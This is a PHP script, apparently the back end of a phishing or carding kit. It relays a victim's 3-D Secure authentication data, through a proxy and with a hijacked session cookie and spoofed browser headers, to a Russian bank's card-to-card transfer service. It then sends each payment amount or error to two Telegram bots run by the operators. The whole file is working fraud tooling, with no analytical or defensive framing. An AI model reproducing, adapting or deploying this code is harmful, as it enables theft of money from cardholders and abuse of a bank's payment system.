<?php

if (isset($_POST["PaRes"]) && isset($_POST["MD"])) {
    
        include 'config.php';
        
        $aa = json_decode(base64_decode($_COOKIE['set']),1);
        
        
        $curl = curl_init();
        curl_setopt_array($curl, [
        CURLOPT_URL => $aa['url'],
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYUSERPWD => $pass,
        CURLOPT_POSTFIELDS => 'MD='.$_POST['MD'].'&PaRes='.urlencode($_POST['PaRes']),
        CURLOPT_HTTPHEADER => array('Cookie: ubrr_city=2; JSESSIONID='.$aa['sess'].'; lid=d7ed6da2886c08ab12f7326b69de7596','Host: twpg.ubrr.ru','Origin: https://p2p.ubrr.ru','Referer: https://p2p.ubrr.ru/transferindexnew.jsp','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',)
        ]);
        $snd = (curl_exec($curl));
        curl_close($curl);
        
        preg_match_all('#<input name="mpixml" type="hidden" value="(.+?)"#is', $snd, $mpixml);
        preg_match_all('#<input name="BrXml" type="hidden" value="(.+?)"#is', $snd, $BrXml);
        
        
        $curl = curl_init();
        curl_setopt_array($curl, [
        CURLOPT_URL => 'https://twpg.ubrr.ru/mpirun.jsp?action=mpi',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYUSERPWD => $pass,
        CURLOPT_POSTFIELDS => 'mpixml='.urlencode($mpixml[1][0]).'&BrXml='.$BrXml[1][0],
        CURLOPT_HTTPHEADER => array('Cookie: ubrr_city=2; JSESSIONID='.$aa['sess'].'; lid=d7ed6da2886c08ab12f7326b69de7596','Host: twpg.ubrr.ru','Origin: https://twpg.ubrr.ru','Referer: https://twpg.ubrr.ru/MPI/ResponseProcessing.jsp','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',)
        ]);
        $check = curl_exec($curl);
        curl_close($curl);
        
        preg_match_all('#<OrderStatus>(.+?)<#is', $check, $mess);
        preg_match_all('#<ResponseDescription>(.+?)<#is', $check, $err);
        
        
        if ($mess[1][0]!='DECLINED'){
    if ($_COOKIE['voz']){
	file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chatid.'&text='.urlencode("❗Сумма платежа: " . $_COOKIE['amount'] . " руб.").'&parse_mode=html');
	file_get_contents('https://api.telegram.org/bot'.$wtoken.'/sendMessage?chat_id='.$wchatid.'&text='.urlencode("❗️ Сумма платежа: " . $_COOKIE['amount'] . " руб.").'&parse_mode=html');
    } else {
	file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chatid.'&text='.urlencode("❗️ Сумма платежа: " . $_COOKIE['amount'] . " руб.").'&parse_mode=html');
	file_get_contents('https://api.telegram.org/bot'.$wtoken.'/sendMessage?chat_id='.$wchatid.'&text='.urlencode("❗️ Сумма платежа: " . $_COOKIE['amount'] . " руб.").'&parse_mode=html');
    }
    setcookie('voz', 0, 0);
    header('Location: ' . $success_url);
            } else {
	file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chatid.'&text='.urlencode("<b>Ошибка: ".$err."\nСумма: ".$_COOKIE['amount']." руб.</b>").'&parse_mode=html');
	file_get_contents('https://api.telegram.org/bot'.$wtoken.'/sendMessage?chat_id='.$wchatid.'&text='.urlencode("<b>Ошибка: ".$err."\nСумма: ".$_COOKIE['amount']." руб.</b>").'&parse_mode=html');
	header('Location: ' . $fail_url);
        }
} else header("HTTP/1.1 401 Unauthorized");

?>